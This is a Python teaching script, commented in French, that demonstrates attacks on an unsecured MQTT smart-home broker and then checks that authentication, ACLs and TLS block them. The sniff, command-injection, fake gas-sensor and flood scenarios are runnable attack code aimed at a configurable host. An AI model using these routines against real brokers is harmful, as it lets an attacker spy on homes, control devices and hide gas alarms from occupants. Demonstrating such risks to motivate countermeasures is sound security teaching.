"""
attack_demo.py (v2)
===================
Demonstration PEDAGOGIQUE des risques d'un broker MQTT vulnerable
et de l'efficacite des contre-mesures (auth + ACL + TLS).

Ce script ne realise AUCUNE attaque reelle : il se connecte simplement,
de maniere LOCALE, au broker pour montrer ce qu'un attaquant pourrait
faire si l'acces n'etait pas restreint.

CINQ scenarios :
 1. SNIFFING       : ecoute de tous les topics (broker vulnerable)
 2. INJECTION      : envoi d'une commande non autorisee a un actionneur
 3. SPOOFING       : publication de fausses mesures de capteur
 4. FLOOD          : tentative de DoS par sur-publication (broker vulnerable)
 5. TLS-BLOCKED    : essai d'attaque sur le broker securise -> echec

Usage :
    python attack_demo.py --scenario sniff      --port 1883
    python attack_demo.py --scenario inject     --port 1883
    python attack_demo.py --scenario spoof      --port 1883
    python attack_demo.py --scenario flood      --port 1883
    python attack_demo.py --scenario tls-blocked --port 8883 \\
        --ca ../mosquitto/secure/certs/ca.crt

NOTE : a utiliser uniquement contre votre propre broker local.
"""

import argparse
import json
import ssl
import time
import paho.mqtt.client as mqtt


# ---------------------------------------------------------------------
# 1. SNIFFING
# ---------------------------------------------------------------------
def scenario_sniff(host: str, port: int, duration: int = 30):
    """Espionnage : on s'abonne a TOUS les topics."""
    print(f"\n[SNIFFING] Ecoute de tous les topics pendant {duration}s...")
    print(f"           Cible : {host}:{port}\n")

    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            print("[+] Connecte SANS authentification (broker vulnerable !)")
            client.subscribe("#")
            print("[+] Abonne a # (TOUS les topics)\n")
        else:
            print(f"[-] Echec de connexion (rc={rc})")

    def on_message(client, userdata, msg):
        try:
            payload = json.dumps(json.loads(msg.payload.decode("utf-8")))
        except (json.JSONDecodeError, UnicodeDecodeError):
            payload = str(msg.payload)
        print(f"[INTERCEPTE] {msg.topic}  ->  {payload}")

    client = mqtt.Client(client_id="attacker-sniffer")
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(host, port, 60)
    client.loop_start()

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    client.loop_stop()
    client.disconnect()
    print("\n[SNIFFING] Termine.")


# ---------------------------------------------------------------------
# 2. INJECTION
# ---------------------------------------------------------------------
def scenario_inject(host: str, port: int):
    """Injection : on envoie une commande non autorisee a la lampe et a la clim."""
    print(f"\n[INJECTION] Envoi de commandes non autorisees vers {host}:{port}")

    client = mqtt.Client(client_id="attacker-injector")
    client.connect(host, port, 60)
    client.loop_start()
    time.sleep(1)

    cmd = {"action": "ON", "intensity": 100}
    client.publish("home/salon/light/cmd", json.dumps(cmd))
    print(f"[+] Publie home/salon/light/cmd -> {cmd}")
    time.sleep(2)

    cmd = {"action": "ON", "mode": "HEAT", "target_temp": 30}
    client.publish("home/chambre/ac/cmd", json.dumps(cmd))
    print(f"[+] Publie home/chambre/ac/cmd -> {cmd}")
    time.sleep(2)

    client.publish("home/salon/light/cmd", json.dumps({"action": "OFF"}))
    print("[+] Publie home/salon/light/cmd -> {'action': 'OFF'}")

    client.loop_stop()
    client.disconnect()
    print("\n[INJECTION] Termine. Verifiez l'etat des actionneurs.\n")


# ---------------------------------------------------------------------
# 3. SPOOFING
# ---------------------------------------------------------------------
def scenario_spoof(host: str, port: int):
    """Spoofing : on publie une fausse mesure de capteur de gaz."""
    print(f"\n[SPOOFING] Publication de fausses donnees vers {host}:{port}")

    client = mqtt.Client(client_id="attacker-spoofer")
    client.connect(host, port, 60)
    client.loop_start()
    time.sleep(1)

    fake_gas = {
        "device_id": "gas-fake",
        "room": "cuisine",
        "type": "gas",
        "value": 50,
        "unit": "ppm",
        "status": "OK",
    }
    client.publish("home/cuisine/gas/state", json.dumps(fake_gas))
    print(f"[+] Publie home/cuisine/gas/state -> {fake_gas}")
    print("    Un attaquant pourrait masquer une vraie fuite de gaz.")
    time.sleep(2)

    client.loop_stop()
    client.disconnect()
    print("\n[SPOOFING] Termine.\n")


# ---------------------------------------------------------------------
# 4. FLOOD (DoS pedagogique)
# ---------------------------------------------------------------------
def scenario_flood(host: str, port: int, count: int = 200):
    """Flood : on publie N messages tres rapidement.

    Sur le broker VULNERABLE, tous passent : le dashboard est sature,
    les vrais capteurs sont noyes dans le bruit.
    Sur le broker SECURISE v2, max_connections + message_size_limit
    + le compte attaquant inexistant rendent l'attaque inefficace.
    """
    print(f"\n[FLOOD] Envoi de {count} messages rapides vers {host}:{port}")
    print("        Simule un attaquant qui sature le dashboard.\n")

    client = mqtt.Client(client_id="attacker-flooder")
    client.connect(host, port, 60)
    client.loop_start()
    time.sleep(0.5)

    fake = {"device_id": "flood", "room": "cuisine", "type": "gas",
            "value": 999, "unit": "ppm", "status": "ALERT"}

    start = time.time()
    for i in range(count):
        client.publish("home/cuisine/gas/state", json.dumps({**fake, "seq": i}))
    elapsed = time.time() - start
    print(f"[+] {count} messages publies en {elapsed:.2f}s "
          f"(~{count/max(elapsed,0.001):.0f} msg/s)")
    print("    Sur le dashboard : la jauge gas saute partout, alertes parasites.")

    time.sleep(1)
    client.loop_stop()
    client.disconnect()
    print("\n[FLOOD] Termine.\n")


# ---------------------------------------------------------------------
# 5. TLS-BLOCKED : montre que le broker securise refuse tout
# ---------------------------------------------------------------------
def scenario_tls_blocked(host: str, port: int, ca: str | None):
    """Verifie qu'aucune des attaques precedentes ne fonctionne sur le broker
    securise (auth + TLS + ACL).
    """
    print(f"\n[TLS-BLOCKED] Test du broker securise {host}:{port}")
    if ca:
        print(f"              CA = {ca}")
    print()

    # Test 1 : connexion anonyme
    print("Test 1 - connexion anonyme (sans mot de passe) :")
    result = {"rc": None}
    def on_conn(c, u, f, rc): result["rc"] = rc

    c = mqtt.Client(client_id="attacker-anon")
    if ca:
        c.tls_set(ca_certs=ca, tls_version=ssl.PROTOCOL_TLSv1_2)
    c.on_connect = on_conn
    try:
        c.connect(host, port, 5)
        c.loop_start()
        time.sleep(2)
        c.loop_stop(); c.disconnect()
    except Exception as e:
        print(f"  -> Exception : {e}")
    if result["rc"] == 0:
        print("  -> ECHEC : connexion acceptee (config incorrecte ?)")
    else:
        print(f"  -> SUCCES : connexion refusee (rc={result['rc']})")

    # Test 2 : avec un faux compte
    print("\nTest 2 - avec un compte invente (hacker/hacker) :")
    result["rc"] = None
    c2 = mqtt.Client(client_id="attacker-fake-creds")
    if ca:
        c2.tls_set(ca_certs=ca, tls_version=ssl.PROTOCOL_TLSv1_2)
    c2.username_pw_set("hacker", "hacker")
    c2.on_connect = on_conn
    try:
        c2.connect(host, port, 5)
        c2.loop_start()
        time.sleep(2)
        c2.loop_stop(); c2.disconnect()
    except Exception as e:
        print(f"  -> Exception : {e}")
    if result["rc"] == 0:
        print("  -> ECHEC : connexion acceptee (config incorrecte ?)")
    else:
        print(f"  -> SUCCES : credentials refuses (rc={result['rc']})")

    # Test 3 : utilisateur valide mais role insuffisant
    print("\nTest 3 - sensor_user essaie de pirater la lampe (escalade ACL) :")
    received = {"got": False}
    def on_msg(c, u, msg): received["got"] = True

    listener = mqtt.Client(client_id="legit-actuator")
    if ca:
        listener.tls_set(ca_certs=ca, tls_version=ssl.PROTOCOL_TLSv1_2)
    listener.username_pw_set("actuator_user", "actuator_pass")
    listener.on_message = on_msg
    try:
        listener.connect(host, port, 5)
        listener.subscribe("home/+/light/cmd")
        listener.loop_start()
        time.sleep(0.5)

        attacker = mqtt.Client(client_id="attacker-sensor")
        if ca:
            attacker.tls_set(ca_certs=ca, tls_version=ssl.PROTOCOL_TLSv1_2)
        attacker.username_pw_set("sensor_user", "sensor_pass")
        attacker.connect(host, port, 5)
        attacker.loop_start()
        time.sleep(0.5)
        attacker.publish("home/salon/light/cmd", json.dumps({"action": "ON"}))
        time.sleep(2)

        attacker.loop_stop(); attacker.disconnect()
        listener.loop_stop(); listener.disconnect()
    except Exception as e:
        print(f"  -> Exception : {e}")

    if received["got"]:
        print("  -> ECHEC : la commande est passee (ACL incorrecte ?)")
    else:
        print("  -> SUCCES : ACL bloque l'escalade de privilege")

    print("\n[TLS-BLOCKED] Resume :")
    print("  - connexion anonyme refusee")
    print("  - credentials invalides refuses")
    print("  - utilisateur valide mais role faible -> ACL bloque")
    print("  - tout le trafic est chiffre par TLS (capture reseau inutile)\n")


# ---------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="Demo pedagogique des risques d'un broker MQTT non protege"
    )
    parser.add_argument(
        "--scenario",
        choices=["sniff", "inject", "spoof", "flood", "tls-blocked"],
        required=True,
        help="Scenario a executer",
    )
    parser.add_argument("--host", default="localhost")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument(
        "--duration", type=int, default=30,
        help="Duree d'ecoute en secondes (sniff)",
    )
    parser.add_argument(
        "--count", type=int, default=200,
        help="Nombre de messages (flood)",
    )
    parser.add_argument(
        "--ca", default=None,
        help="Chemin vers le certificat CA (pour le scenario tls-blocked)",
    )
    args = parser.parse_args()

    print("=" * 60)
    print(" DEMO PEDAGOGIQUE - PROJET LOCAL UNIQUEMENT")
    print(" Aucune attaque reelle. Cible : votre propre broker.")
    print("=" * 60)

    if args.scenario == "sniff":
        scenario_sniff(args.host, args.port, args.duration)
    elif args.scenario == "inject":
        scenario_inject(args.host, args.port)
    elif args.scenario == "spoof":
        scenario_spoof(args.host, args.port)
    elif args.scenario == "flood":
        scenario_flood(args.host, args.port, args.count)
    elif args.scenario == "tls-blocked":
        scenario_tls_blocked(args.host, args.port, args.ca)


if __name__ == "__main__":
    main()
